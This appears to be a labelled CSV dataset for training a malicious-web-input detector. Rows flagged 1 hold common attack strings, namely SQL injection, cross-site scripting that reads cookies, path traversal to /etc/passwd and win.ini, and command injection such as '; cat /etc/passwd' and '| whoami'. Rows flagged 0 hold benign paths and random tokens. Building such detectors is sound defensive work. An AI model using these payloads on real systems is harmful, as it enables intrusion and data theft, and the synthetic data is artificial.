Av4GQrjfyjG61PG,0
admin'/* bypass */OR 1=1,1
profile,0
dashboard,0
javascript:alert(1),1
UBm779Cwe,0
1' o r '1'='1,1
/checkout?id=1489,0
search,0
checkout,0
' OR 6=8 --,1
onerror=alert(1),1
Usz8xtVNi4q2,0
' OR 1=3 --,1
<script>var a=945;alert(a)</script>,1
' OR 7=2 --,1
D2Luep3fpKH,0
XSU5aspOZ,0
admin' --,1
/home?id=6945,0
<script>var a=480;alert(a)</script>,1
' OR 4=4 --,1
1Cqz9MmeRuRPWER,0
g8ADCvVPNQ,0
admin' --,1
ormdyO9O5X,0
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
4kXdJPuDu,0
PhJL22LlqMbO,0
login,0
/checkout?id=9937,0
' OR 7=7 --,1
/contact?id=6694,0
s E l E c T * f R o M a d m i n,1
O4Dgw972kFnicrE,0
' OR 5=2 --,1
/dashboard?session=87827,0
../../../windows/win.ini,1
/settings?session=71057,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
<script>var a=80;alert(a)</script>,1
IjL0yS3FsqVq,0
jRZNm2pA,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=3 --,1
' OR 6=1 --,1
admin'/* bypass */OR 1=1,1
' OR 6=2 --,1
contact,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
/dashboard?session=25588,0
/index?session=62801,0
/dashboard?id=1125,0
' OR 7=3 --,1
/index?session=82968,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
register,0
checkout,0
' OR 3=5 --,1
../../../windows/win.ini,1
' OR 1=7 --,1
dashboard,0
<script>var a=689;alert(a)</script>,1
' OR 2=1 --,1
s E l E c T * f R o M a d m i n,1
' OR 8=3 --,1
admin' --,1
blog,0
oOhDv7o7OeqgS,0
login,0
/profile?id=3367,0
/cart?id=3031,0
/checkout?id=1597,0
<script>var a=897;alert(a)</script>,1
javascript:alert(1),1
/blog?id=9801,0
M6uNCAnIv,0
register,0
register,0
admin' --,1
/checkout?id=8500,0
/index?id=3775,0
' OR 9=2 --,1
/user?id=4155,0
; cat /etc/passwd,1
' OR 5=2 --,1
index,0
U7lJqAd9rKBist1,0
ochYjF4ADAxbdG,0
/register?id=2310,0
<script>var a=659;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=754;alert(a)</script>,1
/blog?session=37218,0
search,0
/home?id=1920,0
; cat /etc/passwd,1
/checkout?session=90143,0
/about?id=299,0
s92mpQQ31M,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
/search?session=27081,0
CudVRQcl4nXAOK,0
/user?session=85588,0
' OR 2=5 --,1
/index?id=7379,0
profile,0
/checkout?id=8119,0
SUyXc6JJN9h,0
/index?session=33431,0
s E l E c T * f R o M a d m i n,1
about,0
/home?session=85859,0
/home?id=5240,0
' OR 8=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
/login?id=3280,0
admin' --,1
odHf8nyQLenZ,0
/user?session=13680,0
<script>var a=655;alert(a)</script>,1
/dashboard?id=9713,0
dashboard,0
' OR 7=2 --,1
<script>var a=213;alert(a)</script>,1
' OR '1'='1,1
Ys8DnOl82yPa,0
' OR 5=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=19795,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=4 --,1
1' o r '1'='1,1
settings,0
/search?session=96913,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
XFEJaWw0SNb3o,0
profile,0
; cat /etc/passwd,1
cart,0
bFIDpLy8MuTWE,0
<script>var a=745;alert(a)</script>,1
<script>var a=603;alert(a)</script>,1
../../../../etc/passwd,1
/dashboard?session=82751,0
contact,0
login,0
settings,0
' OR 3=7 --,1
8BZ0NRWy8BxXyre,0
/profile?id=2597,0
/dashboard?id=6157,0
/login?id=9756,0
dashboard,0
../../../windows/win.ini,1
' OR 3=9 --,1
/login?id=4734,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
MQlB07uwAIGw04,0
/profile?id=2421,0
/about?session=83277,0
../../../../etc/passwd,1
../../../windows/win.ini,1
dashboard,0
<script>var a=857;alert(a)</script>,1
' OR 8=3 --,1
; cat /etc/passwd,1
../../../../etc/passwd,1
contact,0
about,0
/settings?session=17128,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=2 --,1
<script>var a=853;alert(a)</script>,1
/contact?id=6849,0
PhSZbmjs,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
user,0
/settings?id=8318,0
| whoami,1
' OR 6=7 --,1
teyzVfO4l6vraJh,0
admin%00' OR 1=1,1
/index?session=31482,0
/login?session=41552,0
yaeX0tKtF,0
zjMb8aCg3u,0
| whoami,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
kMEHHnm0Qm7ws,0
<script>var a=582;alert(a)</script>,1
' OR 9=9 --,1
6I3jCO1tlDi,0
' OR 1=1 --,1
' OR 7=8 --,1
Uf5eGXFJgQq,0
<script>var a=870;alert(a)</script>,1
/about?id=3861,0
admin'/* bypass */OR 1=1,1
/search?session=31358,0
register,0
/profile?id=8198,0
' OR 4=3 --,1
../../../windows/win.ini,1
/home?id=2386,0
/home?session=20636,0
<script>var a=725;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=742;alert(a)</script>,1
' OR 6=5 --,1
' OR 1=6 --,1
/checkout?session=37780,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
javascript:alert(1),1
settings,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
../../../windows/win.ini,1
6Wc0yhf62,0
javascript:alert(1),1
about,0
' OR 6=8 --,1
/index?session=96677,0
RfAR1mNW9IyV6,0
; cat /etc/passwd,1
/checkout?id=7992,0
/dashboard?session=94959,0
' OR 4=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
' OR 2=7 --,1
search,0
admin'/* bypass */OR 1=1,1
<script>var a=399;alert(a)</script>,1
../../../../etc/passwd,1
' OR 7=2 --,1
user,0
| whoami,1
' OR 3=6 --,1
<script>var a=517;alert(a)</script>,1
contact,0
<script>var a=984;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/search?id=4447,0
checkout,0
/cart?id=7680,0
user,0
/profile?session=23871,0
<script>var a=711;alert(a)</script>,1
/user?id=3615,0
1' o r '1'='1,1
<script>var a=553;alert(a)</script>,1
/dashboard?session=52368,0
/cart?id=8265,0
' OR 6=7 --,1
checkout,0
/dashboard?id=4457,0
4Xdj1G62,0
<script>var a=466;alert(a)</script>,1
<script>var a=855;alert(a)</script>,1
/home?id=9198,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
p6AJzuijrJQ,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
home,0
' OR 1=1 --,1
/cart?session=56980,0
| whoami,1
admin'/* bypass */OR 1=1,1
7bFwq2GMW,0
<script>var a=614;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
hz7zZ9jiT5nl,0
<script>var a=416;alert(a)</script>,1
onerror=alert(1),1
/checkout?session=42966,0
blog,0
admin' --,1
| whoami,1
mL4McpjKcyfcVi,0
' OR 3=4 --,1
dashboard,0
index,0
user,0
home,0
/contact?session=71956,0
javascript:alert(1),1
<script>var a=441;alert(a)</script>,1
/user?session=95414,0
checkout,0
home,0
/home?session=70670,0
Gh04icnf,0
UHBzzDF9AfONAXQ,0
<script>var a=91;alert(a)</script>,1
0SaOG3KniriQvI,0
<script>var a=958;alert(a)</script>,1
<script>var a=189;alert(a)</script>,1
onerror=alert(1),1
' OR 3=6 --,1
5kI3OFv2f,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
<script>var a=60;alert(a)</script>,1
/about?session=94989,0
about,0
/profile?id=9039,0
<script>var a=203;alert(a)</script>,1
onerror=alert(1),1
admin' --,1
| whoami,1
' OR 2=4 --,1
../../../../etc/passwd,1
settings,0
admin%00' OR 1=1,1
/index?session=61481,0
login,0
<script>var a=697;alert(a)</script>,1
/cart?id=6441,0
/about?session=39882,0
cart,0
/home?session=29781,0
/user?session=24079,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
admin' --,1
tWVgMcQP0,0
cart,0
/user?id=1872,0
cRG63vqNAvIEP,0
<script>var a=569;alert(a)</script>,1
<script>var a=986;alert(a)</script>,1
ORNSJXjYge,0
l9RyV9tKXDvIp3,0
' OR 2=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
/register?id=3965,0
' OR 1=7 --,1
login,0
../../../windows/win.ini,1
/index?session=13818,0
/home?session=58795,0
vPpVEYzhy,0
; cat /etc/passwd,1
<script>var a=685;alert(a)</script>,1
contact,0
' OR 8=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
/contact?id=1766,0
profile,0
onerror=alert(1),1
' OR 1=1 --,1
| whoami,1
<script>alert(document.cookie)</script>,1
/settings?id=2817,0
' OR '1'='1,1
/about?id=7115,0
/dashboard?id=5387,0
admin%00' OR 1=1,1
Cdxp3O8nSs,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=61625,0
; cat /etc/passwd,1
' OR 1=7 --,1
' OR 1=1 --,1
login,0
/blog?id=7012,0
cart,0
bOSGTtaA,0
checkout,0
<script>var a=246;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/checkout?session=94149,0
/register?id=261,0
user,0
<script>var a=599;alert(a)</script>,1
/index?id=8925,0
/home?session=76483,0
/login?id=6063,0
home,0
admin%00' OR 1=1,1
U3oXVLb9zG7LKp,0
<script>var a=240;alert(a)</script>,1
' OR 3=7 --,1
admin%00' OR 1=1,1
/contact?session=44469,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=3 --,1
javascript:alert(1),1
sk7r8VjEJZD,0
admin%00' OR 1=1,1
/blog?session=75089,0
/blog?id=8073,0
/contact?id=5303,0
profile,0
checkout,0
/blog?id=9,0
<script>var a=616;alert(a)</script>,1
../../../windows/win.ini,1
/cart?session=12007,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
/contact?session=54936,0
/blog?id=2121,0
' OR 1=9 --,1
/home?id=6470,0
admin%00' OR 1=1,1
<script>var a=231;alert(a)</script>,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=602,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
IhCGhzAE,0
uv1dztGS,0
/contact?session=87583,0
../../../windows/win.ini,1
wsbT0ungLRIuh,0
/settings?id=7504,0
oZ7ITqmACAYg,0
/about?id=9879,0
../../../windows/win.ini,1
/profile?session=19422,0
../../../windows/win.ini,1
<script>var a=295;alert(a)</script>,1
/register?session=60921,0
/search?session=83349,0
admin'/* bypass */OR 1=1,1
login,0
/profile?session=89435,0
home,0
/cart?session=16622,0
/about?id=9210,0
<script>var a=236;alert(a)</script>,1
<script>var a=171;alert(a)</script>,1
/cart?id=8777,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=9623,0
onerror=alert(1),1
/index?id=8838,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=744;alert(a)</script>,1
zB00dre6g,0
' OR '1'='1,1
/login?session=98815,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=550;alert(a)</script>,1
/checkout?id=3097,0
/register?session=32747,0
admin'/* bypass */OR 1=1,1
KVu31HyqNzhRp,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=36236,0
2SmEuRIu,0
s E l E c T * f R o M a d m i n,1
/profile?id=8867,0
/register?session=75882,0
checkout,0
search,0
/profile?id=6593,0
admin'/* bypass */OR 1=1,1
' OR 9=7 --,1
| whoami,1
zfDiIL9Z,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
551p2x5RjlH,0
admin%00' OR 1=1,1
/search?session=85137,0
admin'/* bypass */OR 1=1,1
dPgWJX0WJ,0
<script>var a=64;alert(a)</script>,1
/home?id=7960,0
DV7iwgqkeI8,0
<script>var a=975;alert(a)</script>,1
1' o r '1'='1,1
EBkrTHUDMikz,0
<script>var a=937;alert(a)</script>,1
/search?session=83193,0
<script>var a=108;alert(a)</script>,1
/login?session=31124,0
Ov1KeP5mCc2T,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
9hF6TDYW8i6s5JU,0
Ciyz3gidpLBh,0
aHUOIijyfq,0
<script>var a=234;alert(a)</script>,1
1' o r '1'='1,1
register,0
register,0
hBkQjuAqBONg,0
' OR 4=2 --,1
javascript:alert(1),1
/checkout?id=9923,0
1' o r '1'='1,1
/about?id=2577,0
/profile?id=943,0
/login?id=4673,0
javascript:alert(1),1
/register?session=41278,0
/home?session=37238,0
/about?session=58510,0
/checkout?id=4861,0
/contact?id=4880,0
profile,0
1' o r '1'='1,1
home,0
<script>var a=784;alert(a)</script>,1
f5k2QySe,0
register,0
| whoami,1
/profile?session=48289,0
/contact?id=5687,0
/search?id=1403,0
' OR 8=7 --,1
search,0
CXYGJN7Z,0
search,0
72R5KslX2Jek,0
' OR '1'='1,1
/about?session=81723,0
onerror=alert(1),1
<script>var a=208;alert(a)</script>,1
/index?id=9978,0
/cart?session=44982,0
<script>var a=751;alert(a)</script>,1
<script>var a=668;alert(a)</script>,1
cart,0
FBqV1TIKfKmf7Xd,0
qg3y36ciMdnu,0
1' o r '1'='1,1
admin' --,1
<script>var a=628;alert(a)</script>,1
/blog?session=16431,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
' OR 2=4 --,1
6e2WJV3qLE7vgt,0
' OR 8=4 --,1
/home?id=298,0
/search?id=5525,0
/checkout?session=50527,0
/checkout?session=49338,0
<script>var a=542;alert(a)</script>,1
/about?id=2502,0
admin%00' OR 1=1,1
/cart?id=6234,0
' OR 3=4 --,1
/contact?id=1004,0
/settings?session=40019,0
<script>var a=868;alert(a)</script>,1
search,0
' OR 3=6 --,1
1' o r '1'='1,1
' OR 9=2 --,1
admin' --,1
<script>var a=124;alert(a)</script>,1
' OR 1=6 --,1
1' o r '1'='1,1
admin%00' OR 1=1,1
settings,0
/search?id=293,0
blog,0
search,0
/blog?session=23166,0
/search?session=36148,0
/dashboard?id=9598,0
about,0
7xq192xtYHU8a0,0
/blog?id=7080,0
settings,0
../../../../etc/passwd,1
admin' --,1
<script>var a=684;alert(a)</script>,1
' OR '1'='1,1
POU0BLaJ7,0
/blog?id=6289,0
javascript:alert(1),1
../../../windows/win.ini,1
' OR 8=2 --,1
/settings?session=81592,0
<script>var a=272;alert(a)</script>,1
/settings?id=7449,0
/profile?id=767,0
onerror=alert(1),1
admin' --,1
' OR 1=1 --,1
' OR '1'='1,1
' OR 1=1 --,1
wqnPc8Hjo,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
YVb5u5ezEhFFh,0
/user?id=5510,0
<script>var a=761;alert(a)</script>,1
onerror=alert(1),1
admin%00' OR 1=1,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=7 --,1
/cart?session=20413,0
cart,0
| whoami,1
' OR 5=3 --,1
onerror=alert(1),1
/checkout?id=1609,0
' OR 7=6 --,1
/about?id=4478,0
' OR 1=1 --,1
/blog?id=9129,0
/blog?id=4130,0
<script>var a=487;alert(a)</script>,1
' OR '1'='1,1
/cart?session=24423,0
cart,0
/about?session=13819,0
De4VnOX1BE,0
1' o r '1'='1,1
0wrg032aZF97,0
7v2zgFz6FV,0
cart,0
uMB7oFOJ,0
' OR 5=5 --,1
/user?session=49165,0
/register?session=79658,0
' OR 1=1 --,1
/home?session=78843,0
/register?session=57807,0
onerror=alert(1),1
admin' --,1
' OR 3=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=406;alert(a)</script>,1
' OR 9=7 --,1
/settings?id=587,0
/settings?id=339,0
/dashboard?id=7081,0
u8jtCUUZGTJP0,0
qyEdC6kAFlOUKf9,0
contact,0
/user?id=4204,0
checkout,0
| whoami,1
/search?id=2385,0
/blog?session=83886,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
contact,0
/settings?session=74176,0
; cat /etc/passwd,1
qAMfxtJgA00,0
' OR 4=1 --,1
admin%00' OR 1=1,1
' OR 1=1 --,1
' OR '1'='1,1
profile,0
../../../../etc/passwd,1
/cart?session=76975,0
' OR 6=4 --,1
' OR 9=7 --,1
user,0
GIeXTPww,0
<script>var a=299;alert(a)</script>,1
/profile?session=42440,0
s E l E c T * f R o M a d m i n,1
' OR 6=6 --,1
<script>var a=486;alert(a)</script>,1
; cat /etc/passwd,1
admin' --,1
/profile?id=8606,0
' OR 8=5 --,1
<script>var a=740;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
yToj9zJe66C95Xx,0
o9SOXfeRXc0g32,0
/about?session=33053,0
admin' --,1
admin' --,1
../../../windows/win.ini,1
hoPxdm7F,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=3399,0
/home?id=4533,0
user,0
/blog?session=72765,0
admin' --,1
/dashboard?id=8801,0
<script>var a=999;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/cart?id=6724,0
user,0
user,0
<script>var a=880;alert(a)</script>,1
admin' --,1
cart,0
/index?session=52231,0
1V9P5RXIe8,0
/checkout?id=7473,0
; cat /etc/passwd,1
/register?id=9945,0
; cat /etc/passwd,1
| whoami,1
' OR 3=8 --,1
' OR '1'='1,1
' OR 3=7 --,1
E1NKtzb40XJQiOM,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=5132,0
register,0
admin' --,1
admin' --,1
' OR 1=1 --,1
' OR 7=3 --,1
/cart?session=11562,0
<script>var a=850;alert(a)</script>,1
' OR 4=7 --,1
/settings?session=65031,0
/profile?session=87469,0
index,0
../../../../etc/passwd,1
FXIX75MpnThEVwv,0
blog,0
' OR '1'='1,1
admin' --,1
hknOP1FMxVBC,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
H9anxRlev6,0
Swkiow590L9,0
/checkout?session=92396,0
<script>var a=54;alert(a)</script>,1
/dashboard?id=1946,0
' OR '1'='1,1
JNf8riM7C9N,0
d222OxPB,0
<script>var a=915;alert(a)</script>,1
' OR 6=8 --,1
/login?id=9354,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
admin' --,1
' OR 9=6 --,1
/checkout?id=9673,0
' OR 9=9 --,1
/cart?id=1627,0
cY4nAyMbG7gWa,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
kv0ssPDATd,0
/user?session=47500,0
checkout,0
admin' --,1
' OR 3=3 --,1
ZG59Ui34lxawrbG,0
/cart?id=5926,0
/dashboard?id=1654,0
/contact?id=1043,0
' OR 7=8 --,1
/register?session=46918,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=8 --,1
NpAYg5g7k05q,0
/blog?id=3424,0
<script>var a=732;alert(a)</script>,1
onerror=alert(1),1
cart,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=739;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
/search?id=5095,0
f8KxRFQKQOXDm,0
profile,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
/about?session=30339,0
/profile?id=7352,0
<script>var a=351;alert(a)</script>,1
' OR 6=6 --,1
checkout,0
/register?session=63249,0
javascript:alert(1),1
<script>var a=46;alert(a)</script>,1
' OR 5=3 --,1
viLG4jASp,0
<script>var a=910;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=794;alert(a)</script>,1
/home?session=83536,0
O7XfhAyG00,0
/login?id=6176,0
register,0
XJixywxhw4PesY,0
login,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/search?id=9318,0
' OR 2=5 --,1
/blog?session=94333,0
/home?session=27755,0
SJxgBgnftjfKsI,0
login,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=861;alert(a)</script>,1
uOQua9L8Y5MK,0
../../../windows/win.ini,1
; cat /etc/passwd,1
TOogUibl12Wa4,0
/profile?id=5163,0
/blog?session=79872,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
cart,0
<script>alert(document.cookie)</script>,1
contact,0
onerror=alert(1),1
<script>var a=399;alert(a)</script>,1
KtiVUR1uBO5k,0
| whoami,1
admin'/* bypass */OR 1=1,1
4VpUGCOE,0
s E l E c T * f R o M a d m i n,1
<script>var a=744;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
user,0
9saTjIaLz,0
<script>var a=396;alert(a)</script>,1
| whoami,1
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 1=2 --,1
onerror=alert(1),1
checkout,0
<script>var a=741;alert(a)</script>,1
' OR 2=6 --,1
../../../../etc/passwd,1
/user?session=79666,0
/login?session=44894,0
admin'/* bypass */OR 1=1,1
/login?session=79843,0
xiF26pWbPpH,0
' OR '1'='1,1
' OR 1=6 --,1
/dashboard?session=23281,0
' OR '1'='1,1
/blog?id=1006,0
admin'/* bypass */OR 1=1,1
Z3lihFy993K2FH,0
/about?session=46219,0
javascript:alert(1),1
' OR 9=1 --,1
<script>var a=221;alert(a)</script>,1
/search?session=56028,0
../../../../etc/passwd,1
home,0
<script>var a=185;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 7=4 --,1
<script>var a=169;alert(a)</script>,1
' OR 5=6 --,1
home,0
J4lW7UHsf,0
' OR '1'='1,1
/contact?session=52944,0
COArtmFQ,0
register,0
/checkout?session=11635,0
/settings?id=2194,0
oFYZLFYtKMA7,0
' OR 1=1 --,1
/profile?id=4206,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
hLStvuDHj,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=4 --,1
checkout,0
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 5=8 --,1
/checkout?id=6065,0
/home?session=74980,0
/index?session=10512,0
utwqwGBvHtrzWUj,0
<script>var a=344;alert(a)</script>,1
/cart?id=186,0
<script>var a=183;alert(a)</script>,1
<script>var a=789;alert(a)</script>,1
/home?id=8232,0
/register?session=21775,0
<script>var a=773;alert(a)</script>,1
/register?id=2620,0
' OR 1=1 --,1
' OR 9=3 --,1
/search?id=25,0
dashboard,0
javascript:alert(1),1
/user?id=2194,0
fEIdXcxgfJZqb6J,0
7prZShyH82L,0
/search?id=4708,0
javascript:alert(1),1
<script>var a=38;alert(a)</script>,1
<script>var a=114;alert(a)</script>,1
<script>var a=373;alert(a)</script>,1
/index?id=3333,0
SnfxFloEosil,0
efqX2D0YQsnIIE,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
' OR 3=3 --,1
/blog?session=35936,0
admin' --,1
blog,0
../../../windows/win.ini,1
admin' --,1
/index?session=98018,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
<script>var a=191;alert(a)</script>,1
/dashboard?id=7632,0
/home?session=55094,0
1' o r '1'='1,1
<script>var a=4;alert(a)</script>,1
/index?id=4871,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=7 --,1
login,0
dashboard,0
dashboard,0
login,0
admin'/* bypass */OR 1=1,1
/index?id=8984,0
<script>var a=797;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
' OR 7=4 --,1
Nevhz3MpNkqh,0
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=7398,0
' OR 1=5 --,1
<script>var a=999;alert(a)</script>,1
register,0
/checkout?id=2093,0
login,0
search,0
/contact?id=1897,0
YDar67MkRTOv2,0
admin'/* bypass */OR 1=1,1
' OR 7=8 --,1
<script>var a=626;alert(a)</script>,1
D6WAQhCOPAb,0
' OR 6=4 --,1
blog,0
admin%00' OR 1=1,1
' OR 1=1 --,1
<script>var a=820;alert(a)</script>,1
search,0
/register?session=94040,0
<script>var a=342;alert(a)</script>,1
8rDKxZIUHx,0
nR73bwsDV,0
admin' --,1
contact,0
<script>alert(document.cookie)</script>,1
user,0
/register?id=755,0
<script>var a=136;alert(a)</script>,1
/home?session=87355,0
/contact?session=85758,0
' OR '1'='1,1
YjnCgLy8Gh3tGf,0
/blog?id=8409,0
Z17pB7Ws,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
' OR 9=2 --,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=6 --,1
/search?id=7108,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
contact,0
onerror=alert(1),1
/home?id=1561,0
pZVEfOsC,0
<script>var a=663;alert(a)</script>,1
user,0
javascript:alert(1),1
No030UXL1T7bM0O,0
/checkout?session=14208,0
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
blog,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=308,0
<script>var a=352;alert(a)</script>,1
/dashboard?id=2821,0
/blog?id=9535,0
checkout,0
1' o r '1'='1,1
javascript:alert(1),1
/index?id=9740,0
search,0
<script>var a=150;alert(a)</script>,1
/register?session=93106,0
<script>var a=414;alert(a)</script>,1
' OR 2=8 --,1
FXi2Q89YY0S,0
search,0
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
checkout,0
<script>var a=113;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/blog?id=8768,0
hbpqVW7HyFGjlI,0
<script>var a=282;alert(a)</script>,1
' OR 6=7 --,1
/contact?session=60283,0
gG4516F95KNohaK,0
/settings?session=22794,0
/profile?session=58598,0
1' o r '1'='1,1
<script>var a=851;alert(a)</script>,1
<script>var a=85;alert(a)</script>,1
<script>var a=760;alert(a)</script>,1
' OR 1=1 --,1
' OR 5=2 --,1
<script>var a=4;alert(a)</script>,1
search,0
<script>var a=260;alert(a)</script>,1
' OR 4=9 --,1
home,0
/settings?session=13208,0
' OR 3=5 --,1
blog,0
| whoami,1
/contact?id=6197,0
javascript:alert(1),1
/index?session=80227,0
; cat /etc/passwd,1
/checkout?id=5639,0
register,0
BuZwgyePIHZOaD9,0
<script>var a=889;alert(a)</script>,1
javascript:alert(1),1
<script>var a=502;alert(a)</script>,1
RTTFA1NFsIQ8yU,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
/dashboard?session=53359,0
/about?id=6954,0
1' o r '1'='1,1
/search?session=74734,0
<script>alert(document.cookie)</script>,1
admin' --,1
' OR 1=4 --,1
../../../../etc/passwd,1
<script>var a=259;alert(a)</script>,1
/user?session=34731,0
/search?id=3843,0
/blog?session=53498,0
checkout,0
' OR 1=1 --,1
admin' --,1
' OR '1'='1,1
ygpIY3kl,0
IZ4Y4uB8AE3sizp,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=3337,0
rcyLrtUCEPivlw,0
' OR 4=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=59521,0
/index?id=5475,0
bRBk2lx9kJgc,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
/about?session=61964,0
/register?session=75317,0
' OR 5=1 --,1
user,0
profile,0
../../../../etc/passwd,1
GMEWJXg5,0
yCBXRDrKril,0
admin'/* bypass */OR 1=1,1
' OR 9=2 --,1
<script>var a=887;alert(a)</script>,1
/profile?session=24991,0
/blog?session=46562,0
search,0
' OR '1'='1,1
' OR 9=7 --,1
dYWvletw76,0
/index?session=66304,0
settings,0
../../../windows/win.ini,1
XBgWwNlqFv9id,0
1' o r '1'='1,1
/cart?session=47879,0
' OR 8=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
cart,0
' OR 5=9 --,1
<script>var a=572;alert(a)</script>,1
' OR 4=1 --,1
' OR 8=8 --,1
uhBiJbg202,0
/search?id=8849,0
admin'/* bypass */OR 1=1,1
/search?session=86947,0
<script>var a=530;alert(a)</script>,1
' OR 4=3 --,1
PgcDYOBdr7HSr,0
